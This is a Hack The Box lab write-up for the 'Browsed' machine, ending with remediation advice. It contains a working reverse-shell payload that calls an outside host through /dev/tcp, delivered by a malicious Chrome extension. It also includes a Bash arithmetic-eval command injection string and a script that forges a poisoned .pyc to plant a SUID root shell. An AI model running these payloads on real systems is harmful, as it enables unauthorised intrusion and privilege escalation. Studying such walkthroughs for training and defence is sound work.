---
title: HTB Browsed
slug: htb-browsed-writeup
type: writeup
category: htb
date: 2025-08-18
difficulty: medium
os: linux
readTime: 10 min read
points: 45
tags: [CHROME, BASH, PYCACHE]
classification: CLASSIFIED-WHITE
summary: Extension review portal runs uploaded Chrome extensions inside a headless browser that talks to `localhost` — abuse that to hit a Flask app with a Bash arithmetic-eval bug (`arr[$(…)]`) and land as `larry`. Root comes from a `sudo`-allowed Python tool whose `__pycache__` is mode 777 — drop a poisoned `.pyc` and SUID bash.
engagement:
  platform: Hack The Box
  target: browsed.htb
  ref: 10.129.244.79
  duration: 10 min read
  operator: WDD-01
killchain:
  - { stage: RECON,    sub: "upload portal + internal vhost", tag: HTTP,   color: warn }
  - { stage: SOURCE,   sub: "gitea repo to bash -eq bug",     tag: GITEA,  color: warn }
  - { stage: FOOTHOLD, sub: "malicious chrome extension",     tag: RCE,    color: warn }
  - { stage: USER,     sub: "shell as larry",                 tag: SHELL,  color: warn }
  - { stage: ROOT,     sub: "pycache poisoning",              tag: GOAL,   color: ok }
loadout:
  - { tool: nmap,      purpose: recon }
  - { tool: curl,      purpose: http }
  - { tool: git,       purpose: source }
  - { tool: zip,       purpose: package }
  - { tool: nc,        purpose: listener }
  - { tool: python3.12, purpose: pyc-forge }
remediation:
  - Never treat localhost as a privacy boundary — sandboxed automation routes trust back in
  - Use `[[ "$1" -eq 0 ]]` only on values already validated as numeric (or switch to `string == "0"`)
  - Remove passwordless `sudo` on scripts that import from world-writable paths
  - Chmod `__pycache__` directories to 755 at minimum; audit before shipping
---

::: stage n=1 label="RECON" title="Extension review portal + a hidden Gitea vhost."

Only SSH and HTTP are up. The web app is an extension review platform — upload a `.zip`, their bot loads it in a headless Chrome and screenshots the result. The upload page even tells you the command line:

::: terminal title="shell · operator@kali" lang="bash"
$ curl -s http://10.129.244.79/upload.php
...
timeout 10s xvfb-run /opt/chrome-linux64/chrome --disable-gpu --no-sandbox \
  --load-extension="/tmp/extension_<id>" --remote-debugging-port=0 \
  --disable-extensions-except="/tmp/extension_<id>" \
  --enable-logging=stderr --v=1 \
  http://localhost/ http://browsedinternals.htb
:::

Two target URLs. A throwaway extension that logs `navigator.userAgent` + `window.location` confirms the bot really visits `browsedinternals.htb`. Pin it in `/etc/hosts`:

::: terminal title="shell · operator@kali" lang="bash"
$ echo "10.129.244.79 browsedinternals.htb browsed.htb" | sudo tee -a /etc/hosts
:::

The internal vhost serves {cool:Gitea}. The public repo `larry/MarkdownPreview` is the interesting one.

:::

::: stage n=2 label="SOURCE" title="Flask app on 127.0.0.1:5000 — Bash arithmetic eval."

Cloning the repo exposes a Flask helper and the shell script it wraps:

::: terminal title="shell · operator@kali · source review" lang="python"
# app.py
@app.route('/routines/<rid>')
def routines(rid):
    result = subprocess.run(["./routines.sh", rid],
                            capture_output=True, text=True)
    return f"<pre>{result.stdout}{result.stderr}</pre>"
:::

::: terminal title="shell · routines.sh" lang="bash"
if [[ "$1" -eq 0 ]]; then
    ...
fi
:::

The trap is `-eq`. Bash arithmetic {warn:evaluates the argument as an expression} — not a string compare. Passing `arr[$(id)]` triggers command substitution inside the `[[ ]]` context before the numeric compare even runs.

The Flask app binds `127.0.0.1:5000` only. That's the problem the extension sandbox solves for us.

:::

::: stage n=3 label="FOOTHOLD" title="Extension service worker hits localhost on our behalf."

A tiny extension with a background service worker fires a `fetch` to the vulnerable route on load:

::: terminal title="shell · extension · background.js" lang="javascript"
const lhost = "10.10.16.163";
const lport = "443";
const cmd = `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`;
const b64 = btoa(cmd);
const payload = `arr[$(echo ${b64} | base64 -d | bash)]`;

fetch(`http://127.0.0.1:5000/routines/${encodeURIComponent(payload)}`,
      { mode: "no-cors" });
:::

Zip it, upload, listen:

::: terminal title="shell · operator@kali" lang="bash"
$ zip -r pwnext.zip manifest.json background.js
$ nc -lvnp 443
connect to [10.10.16.163] from (UNKNOWN) [10.129.244.79] 52994
larry@browsed:~$ id
uid=1000(larry) gid=1000(larry)
:::

`user.txt` is right there.

::: tip
The extension bot is the lift — your payload runs in a process that already has routes to internal services nobody else can reach. Always profile what an automation worker can actually talk to.
:::

:::

::: stage n=4 label="USER" title="larry's sudo line names the root-owned tool."

::: terminal title="shell · larry@browsed" lang="bash"
$ sudo -l
User larry may run:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py

$ ls -la /opt/extensiontool
-rwxr-xr-x  root root  extension_tool.py
-rw-r--r--  root root  extension_utils.py
drwxrwxrwx  root root  __pycache__          ← mode 777
:::

`extension_tool.py` imports from `extension_utils`. Python loads bytecode from `__pycache__` when the cache header's `mtime` + size match the source. Write access to the cache directory = write access to what Python actually executes.

:::

::: stage n=5 label="ROOT" title="Forge a .pyc with matching header — SUID bash."

Build a malicious module, compile it, patch the 16-byte Python 3.7+ header to mirror the real `extension_utils.py`. The payload module drops a SUID copy of `bash` into `/tmp/rootbash` when Python imports it:

::: terminal title="shell · larry@browsed · pyc forge" lang="python"
import os, struct, py_compile

target = '/opt/extensiontool/extension_utils.py'
cache  = '/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'

src = (
    "import subprocess\n"
    "\n"
    "def validate_manifest(path):\n"
    "    return {'version':'0.0.1','manifest_version':3,'name':'x'}\n"
    "\n"
    "def clean_temp_files(arg):\n"
    "    subprocess.run(['cp','/bin/bash','/tmp/rootbash'])\n"
    "    subprocess.run(['chmod','4777','/tmp/rootbash'])\n"
)
with open('/tmp/extension_utils.py','w') as f:
    f.write(src)

py_compile.compile('/tmp/extension_utils.py', cfile='/tmp/payload.pyc')
st = os.stat(target)

with open('/tmp/payload.pyc','rb') as f:
    data = bytearray(f.read())
struct.pack_into('<I', data, 8,  int(st.st_mtime))
struct.pack_into('<I', data, 12, st.st_size)

with open(cache,'wb') as f:
    f.write(data)
:::

Trigger it and collect:

::: terminal title="shell · larry@browsed" lang="bash"
$ sudo /opt/extensiontool/extension_tool.py --clean
$ /tmp/rootbash -p
# id
uid=1000(larry) gid=1000(larry) euid=0(root)
# cat /root/root.txt
:::

{ok:Rooted}.

::: note title="WHY IT WORKED"
Python trusts `__pycache__` as long as the header's mtime + size match the source. Those fields are 4-byte little-endian ints at offsets 8 and 12. A writable cache dir is equivalent to writable source, with none of the audit signals of someone editing `.py` files in `/opt/`.
:::

:::
